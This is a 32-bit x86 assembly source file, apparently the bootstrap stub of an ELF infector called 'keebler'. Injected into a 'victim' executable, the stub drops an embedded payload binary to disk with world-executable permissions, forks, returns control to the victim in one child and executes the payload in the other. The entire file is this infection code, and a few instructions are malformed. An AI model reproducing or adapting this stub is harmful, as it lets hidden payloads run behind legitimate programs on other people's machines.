################################################################################
# Bootstrap-32.s
#-------------------------------------------------------------------------------
#
# Unpacks a payload executable, spawns two children, one for the victim and one
# for the payload. It then waits for both to exit, an then calls sys_exit with
# return value 0.
#
# Note: The unpacked executable will be stored in the file system. It is the
#       Responsibility of the executable to remove its file.
################################################################################

.text
.globl _start
_start:
  push %ebp
  mov %esp,%ebp
  push %esi
  push %edi
 
################################################################################
# Open our temporary file
################################################################################
#push "./keebler-bootstrap" onto the stack
  xor %ecx, %ecx
  push %ecx
  mov $0x00000070, %ecx
  push %ecx
  mov $0x61727473, %ecx
  push %ecx
  mov $0x746f6f62, %ecx
  push %ecx
  mov $0x2d72656c, %ecx
  push %ecx
  mov $0x6265656b, %ecx
  push %ecx
  mov %esp, %ebx
  push %ebx #save the string, we'll need it later
#we want to create it if it doesn't exist
  mov $0x242, %ecx
#we want world read write exec
  mov $0x1FF, %edx
#we want the open sys call
  mov $0x05, %eax
  int $0x80
 
################################################################################
# Write to our file!
################################################################################
#file pointer in ebx
  mov %eax, %ebx #grab the file pointer
  push %ebx
#jump to the elf into then call back to get it's memory location
  jmp _elf_info
_save_info:
  pop %ecx #the location in memory of the size
#grab the size
  xor %edx, %edx
  movl (%ecx), %edx
#point to the elf info
  leal 0x4(%ecx), %ecx
#we want the write sys call
  movl $0x04, %eax
  int $0x80
 
################################################################################
# Close our temporary file
################################################################################
#we want the close sys call
  pop %ebx #grab the file pointer
  movl $0x06, %eax
  int $0x80

################################################################################
# Spawn 2 Children
################################################################################
#push a "struct pt_regs" on to the stack in reverse order
  movl %esp, %ebx
  push %ebx
  push %ecx
  push %edx
  push %esi
  push %edi
  push %ebp
  push %eax
  push $0 #xds
  push $0 #%xes
  push $0 #%xfs
  push $0 #%xgs
  push $0 #%orig_eax
  push $0 #%eip
  push $0 #%xcs
  push $0 #%eflags
  push %ebx #esp
  push $0 #%xss
#save the location of this monstrosity on in ebx
  movl %esp, %ebx
#we want sys_fork
  movl $0x02, %eax
  int $0x80

#if something fucked up, return to cild
  cmp $-1, %eax
  jz _return_to_target
#if we are the child jump to the end
  cmp $0, %eax
  jz _return_to_target

#Spawn another process, this time for the payload
  movl %esp, %ebx
  push %eax # save the process id of the victim
#we want sys_fork
  movl $0x02, %eax
  int $0x80

#if something fucked up, abort
  cmp $-1, %eax
  jz _sys_exit
#if we are the child jump to the end
  cmp $0, %eax
  jz _spawn_payload


################################################################################
# Reap both of our children and gracefully return
################################################################################
  pop %ecx #the process id of the victim
  movl %ebx, %esp #pop the register struct off the stack
  pop %edx #remove the exe path from the stack also

  mov $0, %ebx #we want to wait for all children
  mov $0, %ecx #pid doesn't matter
  mov $0, %edx #hopefully we can pass in null here
  mov $4, %esi #only wait for terminated children
  mov $0, %edi #hopefully we can pass in null here
  mov $0x11c, %eax #waitid syscall
  int $0x80

  mov $0, %ebx #we want to wait for all children
  mov $0, %ecx #pid doesn't matter
  mov $0, %edx #hopefully we can pass in null here
  mov $4, %esi #only wait for terminated children
  mov $0, %edi #hopefully we can pass in null here
  mov $0x11c, %eax #waitid syscall
  int $0x80

  jmp _sys_exit


################################################################################
# Execute the bootstrapped elf
################################################################################
_spawn_payload:
  movl %ebx, %esp #pop the register struct off the stack
#load the file string
  pop %ebx
#Create an array of string pointers on the stack or ARGV and ENV
  push $0 #must be null terminated
  movl %esp, %edx #save just the null array for ENV
  push %ebx #push the file path
  movl %esp, %ecx #argv is [filepath,0]
#we want the execve sys call
  movl $0x0b, %eax
  int $0x80

################################################################################
# Gracefully exit this process
################################################################################
_sys_exit:
  movl $0, %ebx
  movl $0x01, %eax # exit(3c)
  int $0x80

################################################################################
# Return control to the victim 
################################################################################
_return_to_target:
  movl %ebx, %esp #pop the register struct
  pop %ecx
#pop the location of the file path string
  pop %ecx
#pop off all our strings
  pop ecx
  pop ecx
  pop ecx
  pop ecx
  pop ecx

#return
  pop %edi
  pop %esi
  pop %ebp
  ret

################################################################################
# Where the embeded executable will go
################################################################################
_elf_info:
  call _save_info
#replaced by bootstrap.pl
_elf_size: <_elf_size>
_elf_data: <_elf_data>
